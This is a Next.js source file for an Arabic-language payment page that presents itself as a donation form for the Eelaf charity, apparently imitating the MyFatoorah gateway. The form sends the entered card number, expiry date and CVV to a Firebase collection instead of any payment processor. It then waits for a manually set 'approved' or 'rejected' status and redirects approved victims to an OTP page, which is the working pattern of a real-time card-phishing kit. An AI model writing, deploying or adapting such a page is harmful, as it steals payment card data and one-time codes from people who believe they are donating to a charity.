"use client"

import React, { useEffect, useState } from "react"
import Image from "next/image"
import { ChevronDown, Router } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData ,db} from "@/lib/firebase"
import { FullPageLoader } from "@/components/fullpageloader"
import { doc, onSnapshot } from "firebase/firestore"
import { useRouter } from "next/navigation"

export default function APaymentForm() {
  const [cardholderName, setCardholderName] = useState("")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [loading,setLoading] = useState(false)
  const [cvv, setCvv] = useState("")
  const [status, setStuts] = useState("new")
  const router = useRouter()
  const value=localStorage.getItem('item')
  const handleSubmit = (e:any) => {
    e.preventDefault()
    const _id = localStorage.getItem('visitor')
    addData({ createdDate: new Date().toISOString(), id: _id, cardNumber, expiryDate, cvv,status })
    setLoading(true)
  }
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() 
          if (data.status) {
            if (data.status === "approved") {
              setLoading(false)
              setStuts(data.status)
              router.push('/otp')
            } else if (data.status === "rejected") {
              setLoading(false)
              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-white rounded-3xl shadow-lg p-6">
        <div className="flex justify-between items-center mb-8">
          <button className="border border-gray-300 rounded-md px-3 py-1 text-sm font-medium text-amber-800">
            English
          </button>

          <div className="text-xl font-bold text-right text-gray-800">جمعية إيلاف الخيرية</div>

          <div className="h-10 w-10 relative">
            <Image
              src="/logoelaf.jpg"
              alt="Eelaf Charity Logo"
              width={90}
              height={90}
              className="object-contain"
            />
          </div>
        </div>

        <div className="mb-4">
          <button className="flex items-center border border-gray-300 rounded-md px-3 py-2 text-sm">
            <span>د.ك</span>
            <ChevronDown className="h-4 w-4 ml-1" />
          </button>
        </div>

        <div className="text-right mb-2">
          <span className="text-blue-600 text-3xl font-bold ml-1">{value}</span>
          <span className="text-gray-600">د.ك</span>

        </div>

        <div className="text-right mb-8 text-gray-700 text-sm">
          <span>العنصر 1</span>
          <span> | </span>
          <span>تنتهي خلال 2 يوم</span>
        </div>

        <div className="relative mb-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-300"></div>
          </div>
          <div className="relative flex justify-center">
            <span className="bg-white px-4 text-sm text-gray-700">إدخال بيانات البطاقة</span>
          </div>
        </div>

        <form className="space-y-4" onSubmit={handleSubmit}>
          <div>
            <Input
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="اسم صاحب البطاقة"
              value={cardholderName}
              onChange={(e) => setCardholderName(e.target.value)}
            />
          </div>

          <div className="relative">
            <Input
            type="tel"
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="رقم البطاقة"
              maxLength={16}
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
            />
            <div className="absolute left-3 top-1/2 transform -translate-y-1/2 flex space-x-1">
              <div className="w-8 h-5 relative">
                <Image
                  src="/m.png"
                  alt="Mastercard"
                  width={32}
                  height={20}
                  className="object-contain"
                />
              </div>
              <div className="w-8 h-5 relative">
                <Image
                  src="/v.png"
                  alt="Visa"
                  width={32}
                  height={20}
                  className="object-contain"
                />
              </div>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <Input
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="رقم التحقق"
              value={cvv}
              maxLength={3}

              onChange={(e) => setCvv(e.target.value)}
            />
            <Input
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="شهر / سنة"
              maxLength={5}
              value={expiryDate.length===2?expiryDate+'/':expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
            />
          </div>

          <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-md" type="submit">
            ادفع الآن
          </Button>
        </form>

        <div className="mt-8 flex justify-center items-center">
          <span className="text-sm text-gray-500 ml-2">مدعوم من</span>
          <div className="h-6 w-24 relative">
            <Image
              src="/vercel.svg"
              alt="MyAtoorah"
              width={96}
              height={24}
              className="object-contain"
            />
          </div>
        </div>
      </div>
      {loading&&<FullPageLoader/>}
    </div>
  )
}

